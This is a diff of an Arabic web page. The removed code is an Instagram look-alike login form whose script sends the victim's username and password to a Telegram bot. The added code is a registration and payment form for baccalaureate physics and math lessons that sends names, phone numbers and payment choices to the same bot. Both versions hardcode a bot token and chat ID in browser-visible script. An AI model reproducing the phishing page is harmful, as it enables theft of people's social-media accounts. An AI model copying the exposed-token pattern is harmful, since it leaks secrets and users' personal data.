@@ -6,101 +6,128 @@
     <title>تسجيل الدخول</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #fafafa;
+            font-family: 'Arial', sans-serif;
+            background: #f7f7f7;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .login-container {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
+        .container {
+            background: linear-gradient(135deg, #f06, #ff9);
             border-radius: 10px;
-            width: 350px;
+            padding: 30px;
+            width: 300px;
             text-align: center;
-            padding: 40px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 1.5s ease-in-out;
         }
-        .logo {
-            font-size: 32px;
-            font-weight: bold;
-            color: #262626;
+        h2 {
             margin-bottom: 20px;
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: #fff;
+            font-size: 24px;
         }
-        input[type="text"], input[type="password"] {
+        input, select {
             width: 100%;
-            padding: 12px 15px;
-            margin: 8px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            background-color: #fafafa;
-            font-size: 14px;
-        }
-        input:focus {
-            outline: none;
-            border-color: #a3a3a3;
-        }
-        button {
-            width: 100%;
-            background-color: #0095f6;
-            color: white;
             padding: 10px;
-            border: none;
+            margin: 10px 0;
+            border: 2px solid #ccc;
             border-radius: 5px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
+            box-sizing: border-box;
         }
-        button:hover {
-            background-color: #007acc;
+        input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">Instagram</div>
+
+    <div class="container">
+        <h2>تسجيل الدخول</h2>
         <form id="loginForm">
-            <input type="text" id="username" placeholder="اسم المستخدم" required />
-            <input type="password" id="password" placeholder="كلمة المرور" required />
-            <button type="submit">تسجيل الدخول</button>
+            <input type="text" id="fullName" placeholder="الاسم الكامل" required>
+            <input type="text" id="phoneNumber" placeholder="رقم الهاتف" required pattern="\d+" title="الرجاء إدخال أرقام فقط">
+            <select id="level" required>
+                <option value="">اختر المستوى</option>
+                <option value="أولى باك">أولى باك</option>
+                <option value="ثانية باك">ثانية باك</option>
+            </select>
+            <select id="subject" required>
+                <option value="">اختر المادة</option>
+                <option value="الفيزياء">الفيزياء</option>
+                <option value="الرياضيات">الرياضيات</option>
+            </select>
+            <label for="paymentMethod">طريقة الدفع:</label>
+            <select id="paymentMethod" required>
+                <option value="">اختر طريقة الدفع</option>
+                <option value="كاش بلوس">كاش بلوس</option>
+                <option value="بريد بنك">بريد بنك</option>
+                <option value="بايبال">بايبال</option>
+            </select>
+            <!-- تم إزالة حقل المبلغ لأن المبلغ ثابت (200DH) -->
+            <input type="submit" value="إرسال">
         </form>
     </div>
 
     <script>
-        const botToken = '8080174902:AAHX9XK3_Yd-TkY8Vq2LBzK8BGCWFmqy17o'; // توكن البوت
-        const chatId = '7203065656'; // معرف الدردشة الخاص بك
-        const secretKey = 'mySecretKey123'; // مفتاح التحقق
+        const loginForm = document.getElementById('loginForm');
 
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // منع إرسال النموذج الافتراضي
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault();
 
-            // جمع البيانات
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            // جمع القيم المدخلة
+            const fullName = document.getElementById('fullName').value;
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const level = document.getElementById('level').value;
+            const subject = document.getElementById('subject').value;
+            const paymentMethod = document.getElementById('paymentMethod').value;
+            
+            // المبلغ ثابت 200DH
+            const amount = 200;
 
-            // تحقق من أن البيانات تحتوي على المفتاح السري
-            if (username !== secretKey) {
-                alert("التحقق فشل! المفتاح السري غير صحيح.");
+            // التحقق من أن رقم الهاتف يحتوي على أرقام فقط
+            const phoneRegex = /^\d+$/;
+            if (!phoneRegex.test(phoneNumber)) {
+                alert('يرجى إدخال رقم هاتف صالح يحتوي على أرقام فقط');
                 return;
             }
 
-            // رسالة التي ستُرسل
-            const message = `👤 اسم المستخدم: ${username}\n🔒 كلمة المرور: ${password}\n🔑 المفتاح السري: ${secretKey}`;
+            // توكن بوت تليغرام و ID
+            const token = '8080174902:AAHX9XK3_Yd-TkY8Vq2LBzK8BGCWFmqy17o';
+            const chatId = '7203065656';
 
-            // رابط API تيليغرام
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            // الرسالة المرسلة إلى تليغرام
+            const message = `الاسم الكامل: ${fullName}\nرقم الهاتف: ${phoneNumber}\nالمستوى: ${level}\nالمادة: ${subject}\nطريقة الدفع: ${paymentMethod}\nالمبلغ: ${amount} درهم`;
 
-            // إرسال الطلب
-            fetch(url)
-                .catch(error => {
-                    console.error('Error:', error); // تسجيل الأخطاء في وحدة التحكم فقط
+            // إرسال البيانات إلى بوت تليغرام
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("تم إرسال البيانات بنجاح!");
+                        // يمكنك إعادة توجيه المستخدم إلى الصفحة الثانية هنا إن أردت
+                        window.location.href = "page2.html"; // استبدل مع رابط الصفحة التالية
+                    } else {
+                        alert('حدث خطأ أثناء إرسال البيانات');
+                    }
                 });
-
-            // إعادة تعيين الحقول
-            document.getElementById('loginForm').reset(); // إعادة تعيين النموذج
         });
     </script>
 </body>
